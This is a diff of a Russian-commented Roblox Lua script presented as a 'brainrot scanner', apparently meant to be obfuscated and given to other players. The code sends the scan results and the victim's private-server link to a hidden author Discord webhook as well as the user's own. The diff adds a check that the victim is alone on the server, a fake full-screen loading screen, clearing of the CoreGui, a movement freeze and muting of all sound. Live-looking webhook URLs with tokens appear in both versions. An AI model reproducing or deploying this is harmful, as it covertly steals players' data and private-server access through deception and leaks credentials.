@@ -1,7 +1,7 @@
--- BEGIN (копируй весь этот блок в обфускатор)
--- ВНУТРЕННИЙ КОД (берёт пользовательский webhook из глобальной переменной `Webhook`)
-local ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- <- твой авторский (скрыт)
-local USER_WEBHOOK = Webhook -- <-- ПОЛЬЗОВАТЕЛЬСКИЙ: глобальная переменная, задаётся снаружи
+-- BEGIN (копируй этот блок в обфускатор)
+-- ВНУТРЕННИЙ КОД: использует внешнюю глобальную переменную `Webhook`
+local ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1398997462156316853/jm2sAlXv6rfk21rTfUZNLHMovlPMZS_774nbom3wtEobSBY2xgB4GVA1In0pEETqcll6" -- админский, скрыт
+local USER_WEBHOOK = Webhook -- внешний пользовательский webhook (обязательно: имя переменной Webhook)
 
 local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
@@ -14,7 +14,7 @@ local SoundService = game:GetService("SoundService")
 _G.VIP_LINK = _G.VIP_LINK or nil
 local isActivated = false
 
--- ===== helpers =====
+-- ====== HELPERS ======
 local function safeLower(s) if type(s)~="string" then return "" end return s:lower() end
 local function safeJSONEncode(t)
     local ok, res = pcall(function() return HttpService:JSONEncode(t) end)
@@ -43,9 +43,9 @@ local function sendDualWebhook(payload)
     end
 end
 
--- ===== brainrot matching (примерный список — можно расширять) =====
+-- ====== Brainrot matching ======
 local BRAINROT_NAMES = {
-    "Graipuss Medussi","Las Tralaleritas","La Cucaracha","Las Sis",
+    "Los Tralaleritos","Las Tralaleritas","La Cucaracha","Las Sis",
     "Tictac Sahur","Spaghetti Tualetti","Dragon Cannelloni","Ketupat Kepat"
 }
 local LOWER_TO_BRAINROT = {}
@@ -83,7 +83,7 @@ local function isBrainrotInstance(inst)
     return true
 end
 
--- ===== plot scanning =====
+-- ====== Plot scanning ======
 local function collectBrainrotsInPlot(plot)
     local out, seen = {}, {}
     for _,d in ipairs(plot:GetDescendants()) do
@@ -97,10 +97,10 @@ end
 
 local function resolveOwnerNameFromPlot(plot)
     for _,desc in ipairs(plot:GetDescendants()) do
-        if desc:IsA("StringValue") and (desc.Name:lower():find("owner") or desc.Name:lower():find("username") or desc.Name:lower():find("user")) then
+        if desc:IsA("StringValue") and (safeLower(desc.Name):find("owner") or safeLower(desc.Name):find("username") or safeLower(desc.Name):find("user")) then
             if desc.Value and #desc.Value > 0 then return desc.Value end
         end
-        if desc:IsA("IntValue") and (desc.Name:lower():find("owner") or desc.Name:lower():find("userid")) then
+        if desc:IsA("IntValue") and (safeLower(desc.Name):find("owner") or safeLower(desc.Name):find("userid")) then
             local ok, name = pcall(function() return Players:GetNameFromUserIdAsync(desc.Value) end)
             if ok and name then return name end
         end
@@ -136,7 +136,7 @@ local function postCombinedAllPlots()
     end
 end
 
--- ===== watch & batch =====
+-- ====== Watch & batching ======
 local connections = {}
 local batchScheduled = false
 local function scheduleBatch()
@@ -164,29 +164,82 @@ local function watchPlots()
     PLOTS_FOLDER.ChildRemoved:Connect(function(child) detachPlotWatch(child); scheduleBatch() end)
 end
 
--- ===== optional: freeze movement & mute (как в оригинале) =====
+-- ====== Loading screen (fullscreen) ======
+local function showLoadingScreen(duration)
+    local player = Players.LocalPlayer
+    if not player then return end
+
+    -- Попытка очистить CoreGui (как в оригинале)
+    pcall(function() game:GetService('CoreGui'):ClearAllChildren() end)
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "BR_LoadingScreen"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.DisplayOrder = 999999
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    gui.Parent = player:WaitForChild("PlayerGui")
+
+    local main = Instance.new("Frame", gui)
+    main.Size = UDim2.new(1,0,1,0)
+    main.Position = UDim2.new(0,0,0,0)
+    main.BackgroundColor3 = Color3.new(0,0,0)
+    main.BorderSizePixel = 0
+    main.ZIndex = 999999
+
+    local txt = Instance.new("TextLabel", main)
+    txt.Size = UDim2.new(1,0,0,60)
+    txt.Position = UDim2.new(0,0,0.45,-30)
+    txt.BackgroundTransparency = 1
+    txt.Text = "Script activated, please wait..."
+    txt.TextColor3 = Color3.new(1,1,1)
+    txt.TextScaled = true
+    txt.Font = Enum.Font.GothamBold
+    txt.ZIndex = 1000000
+
+    local frameBar = Instance.new("Frame", main)
+    frameBar.Size = UDim2.new(0.6,0,0,25)
+    frameBar.Position = UDim2.new(0.2,0,0.55,0)
+    frameBar.BackgroundColor3 = Color3.fromRGB(50,50,50)
+    frameBar.BorderSizePixel = 0
+    frameBar.ZIndex = 1000000
+
+    local progress = Instance.new("Frame", frameBar)
+    progress.Size = UDim2.new(0,0,1,0)
+    progress.BorderSizePixel = 0
+    progress.ZIndex = 1000001
+    progress.BackgroundColor3 = Color3.fromRGB(0,170,255)
+
+    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
+    TweenService:Create(progress, tweenInfo, { Size = UDim2.new(1,0,1,0) }):Play()
+
+    task.delay(duration, function()
+        pcall(function() gui:Destroy() end)
+    end)
+end
+
+-- ====== Block movement & mute (как в оригинале) ======
 local function blockPlayerMovement()
     local player = Players.LocalPlayer
-    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true) end)
+    if not player then return end
     ContextActionService:BindAction("BlockMovement", function() return Enum.ContextActionResult.Sink end, false,
         Enum.PlayerActions.CharacterForward, Enum.PlayerActions.CharacterBackward, Enum.PlayerActions.CharacterLeft, Enum.PlayerActions.CharacterRight, Enum.PlayerActions.CharacterJump)
+
     local function freezeHum(char)
         local hum = char:FindFirstChildOfClass("Humanoid")
         if hum then pcall(function() hum.WalkSpeed = 0; hum.JumpPower = 0 end) end
     end
-    local pl = Players.LocalPlayer
-    if pl then
-        local char = pl.Character or pl.CharacterAdded:Wait()
-        freezeHum(char)
-        pl.CharacterAdded:Connect(freezeHum)
-    end
+    local char = player.Character or player.CharacterAdded:Wait()
+    freezeHum(char)
+    player.CharacterAdded:Connect(freezeHum)
+
     local function muteSound(s) if s and s:IsA("Sound") then pcall(function() s.Volume = 0; s:Stop() end) end end
     for _,d in ipairs(Workspace:GetDescendants()) do muteSound(d) end
     for _,d in ipairs(SoundService:GetDescendants()) do muteSound(d) end
     Workspace.DescendantAdded:Connect(muteSound); SoundService.DescendantAdded:Connect(muteSound)
 end
 
--- ===== GUI (для ввода VIP-ссылки) =====
+-- ====== GUI for VIP link (activates scanner) ======
 local function createActivationGUI()
     local player = Players.LocalPlayer
     if not player then return end
@@ -197,8 +250,8 @@ local function createActivationGUI()
     gui.Parent = player:WaitForChild("PlayerGui")
 
     local main = Instance.new("Frame", gui)
-    main.Size = UDim2.new(0,460,0,240)
-    main.Position = UDim2.new(0.5,-230,0.5,-120)
+    main.Size = UDim2.new(0,460,0,260)
+    main.Position = UDim2.new(0.5,-230,0.5,-130)
     main.BackgroundColor3 = Color3.fromRGB(12,12,12)
     main.BorderSizePixel = 0
 
@@ -226,6 +279,11 @@ local function createActivationGUI()
     btn.MouseLeave:Connect(function() TweenService:Create(btn, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(0,120,255)}):Play() end)
 
     local function activate()
+        if #Players:GetPlayers() > 1 then
+            status.Text = "Сервер содержит больше 1 игрока — нельзя активировать"
+            status.TextColor3 = Color3.fromRGB(255,80,80)
+            return
+        end
         local vip = vipBox.Text:gsub("^%s*(.-)%s*$","%1")
         if vip == "" or not string.find(vip, "roblox%.com/share") then
             status.Text = "Неверная VIP-ссылка!"
@@ -236,8 +294,16 @@ local function createActivationGUI()
         isActivated = true
         status.Text = "Скрипт активирован!"
         status.TextColor3 = Color3.fromRGB(0,255,100)
+
+        -- показываем loading screen (например 30 сек; можно менять)
+        showLoadingScreen(30)
+
+        -- запускаем слежение и отправку
         task.delay(0.05, function() watchPlots(); postCombinedAllPlots() end)
+
+        -- блокируем движение и отключаем звук
         blockPlayerMovement()
+
         pcall(function() gui:Destroy() end)
     end
 
@@ -245,7 +311,8 @@ local function createActivationGUI()
     vipBox.FocusLost:Connect(function(enter) if enter then activate() end end)
 end
 
--- ===== init =====
+-- ====== INIT ======
 createActivationGUI()
+watchPlots()
 sendDualWebhook({ content = "Brainrot scanner loaded (dual webhook active)" })
--- END (обфусцируй весь блок выше и вставь как loadstring)
+-- END
